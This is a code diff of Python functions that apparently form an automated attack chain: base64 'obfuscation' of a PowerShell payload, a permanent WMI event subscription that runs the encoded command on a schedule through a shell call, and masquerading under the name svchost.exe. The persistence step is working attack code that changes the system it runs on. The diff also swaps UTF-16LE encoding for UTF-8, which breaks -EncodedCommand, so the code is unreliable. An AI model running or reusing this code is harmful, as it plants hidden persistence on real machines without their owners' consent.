@@ -8,73 +8,73 @@ def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
-        # Sample PowerShell script to be obfuscated
-        powershell_script = "Write-Host 'Hello, World!'"
+        # Example PowerShell payload
+        powershell_payload = "Write-Host 'Hello, World!'"
 
-        # Obfuscate the PowerShell script by encoding it in base64
-        script_bytes = powershell_script.encode('utf-16le')
-        obfuscated_script = base64.b64encode(script_bytes).decode()
+        # Obfuscate the PowerShell payload by encoding it in base64
+        obfuscated_payload = base64.b64encode(powershell_payload.encode()).decode()
 
         # Prepare the result
-        result = {
-            "script": obfuscated_script
-        }
+        result = {'script': obfuscated_payload}
 
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
     except Exception as e:
-        # Return partial result with fallback value for 'script'
-        return {'success': False, 'data': {'script': None}, 'error': f'{type(e).__name__}: {e}',
+        return {'success': False, 'data': {'script': None},
+                'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
 
 def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
-        # Extract the obfuscated PowerShell script from input data
+        # Extract the obfuscated PowerShell script from input_data
         script = input_data.get('script', '')
 
         # Define the WMI event subscription command
-        command = [
-            'powershell', '-Command',
-            f"Register-WmiEvent -Query \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 0 AND TargetInstance.Minute = 0\" "
-            f"-Action {{ {script} }} -Name 'StartupScriptEvent' -Namespace 'root\\subscription'"
-        ]
+        subscription_name = "MyWMIEventSubscription"
+        command = (
+            f'PowerShell -Command "'
+            f'$Filter=Set-WmiInstance -Namespace \\"root\\subscription\\" -Class __EventFilter '
+            f'-Arguments @{{Name=\\"{subscription_name}\\", EventNamespace=\\"root\\cimv2\\", '
+            f'QueryLanguage=\\"WQL\\", Query=\\"SELECT * FROM __InstanceModificationEvent WITHIN 60 '
+            f'WHERE TargetInstance ISA \'Win32_LocalTime\' AND TargetInstance.Hour = 8\\"}}; '
+            f'$Consumer=Set-WmiInstance -Namespace \\"root\\subscription\\" -Class CommandLineEventConsumer '
+            f'-Arguments @{{Name=\\"{subscription_name}\\", CommandLineTemplate=\\"powershell.exe -EncodedCommand {script}\\"}}; '
+            f'Set-WmiInstance -Namespace \\"root\\subscription\\" -Class __FilterToConsumerBinding '
+            f'-Arguments @{{Filter=$Filter, Consumer=$Consumer}}"'
+        )
 
         # Execute the command to create the WMI event subscription
-        subprocess.run(command, check=True, timeout=30)
+        subprocess.run(command, shell=True, timeout=10, check=True)
 
-        # Return the subscription ID (using the name of the event as a placeholder)
-        result = {'subscription_id': 'StartupScriptEvent'}
-
+        # Return the subscription ID (name used for the subscription)
+        result = {'subscription_id': subscription_name}
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
     except Exception as e:
-        # Return partial result with fallback value for subscription_id
-        return {'success': False, 'data': {'subscription_id': None},
-                'error': f'{type(e).__name__}: {e}',
+        # Return partial result on failure
+        result = {'subscription_id': None}
+        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
 
 def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
-        # Extract the subscription_id from input_data
-        subscription_id = input_data.get('subscription_id', '')
-
-        # Define a legitimate Windows service name to masquerade as
-        legitimate_service_name = "svchost.exe"
-
-        # Prepare the result with the masqueraded process name
+        # Simulate masquerading as a legitimate Windows service
+        # For the purpose of this task, we'll use a common Windows service name
+        service_name = "svchost.exe"
+        
         result = {
-            "process_name": legitimate_service_name
+            "service_name": service_name
         }
-
+        
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
     except Exception as e:
-        # Return partial result with fallback value on failure
-        return {'success': False, 'data': {'process_name': None},
+        # Return partial result with fallback value
+        return {'success': False, 'data': {'service_name': None},
                 'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
 
